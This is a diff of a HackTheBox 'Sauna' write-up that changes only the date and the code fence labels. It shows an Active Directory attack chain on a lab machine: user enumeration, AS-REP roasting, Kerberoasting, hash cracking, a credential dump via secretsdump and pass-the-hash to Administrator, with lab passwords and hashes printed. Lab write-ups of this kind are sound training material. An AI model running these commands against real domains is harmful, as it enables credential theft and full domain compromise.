@@ -1,6 +1,6 @@
 ---
 title: "Sauna"
-date: 2025-06-20
+date: 2024-11-19
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.175
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 13:28 CET
 Nmap scan report for 10.10.10.175
@@ -72,7 +72,7 @@ There is an about page with the people of the company. We can make a user list w
 
 ![](../assets/Pasted%20image%2020241119163350.png)
 
-```bash
+```shell
 fergus.smith
 fsmith
 hugo.bear
@@ -89,7 +89,7 @@ sdriver
 
 Use `kerbrute` to find a valid user.
 
-```bash
+```shell
 $ ./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 ../users 
 
     __             __               __     
@@ -111,7 +111,7 @@ And we have `fsmith`, now the password.
 
 We can try an ASREPRoasting with the user and blank password.
 
-```bash
+```shell
 $ impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request -format hashcat 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -122,7 +122,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3
 
 Using `hashcat` we get the password `'fsmith:Thestrokes23'`.
 
-```bash
+```shell
 $ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt  
 hashcat (v6.2.6) starting
 
@@ -133,7 +133,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3
 
 ## Initial Access
 
-```bash
+```shell
 $ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
  
 Evil-WinRM shell v3.7
@@ -153,7 +153,7 @@ Get the flag
 
 We can do a Kerberoasting attack.
 
-```bash
+```shell
 $ faketime '2024-11-20 02:56:20' impacket-GetUserSPNs -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -170,7 +170,7 @@ $krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cbd0dc
 
 There is a user that can be Kerberoasted named `HSmith`, let's use `hashcat`.
 
-```bash
+```shell
 $ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt   
 hashcat (v6.2.6) starting
 
@@ -188,7 +188,7 @@ Upload `sharphound` and run `sh.exe -c All` and upload to `bloodhound`.
 
 Running `winpeas` we find:
 
-```bash
+```shell
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  EGOTISTICALBANK
@@ -200,7 +200,7 @@ Running `winpeas` we find:
 
 ![](../assets/Pasted%20image%2020241120092725.png)
 
-```bash
+```shell
 $ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -218,7 +218,7 @@ EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84f
 
 We have the `administrator` hash, we can use `evil-winrm` with PTH.
 
-```bash
+```shell
 $ evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
                                         
 Evil-WinRM shell v3.7
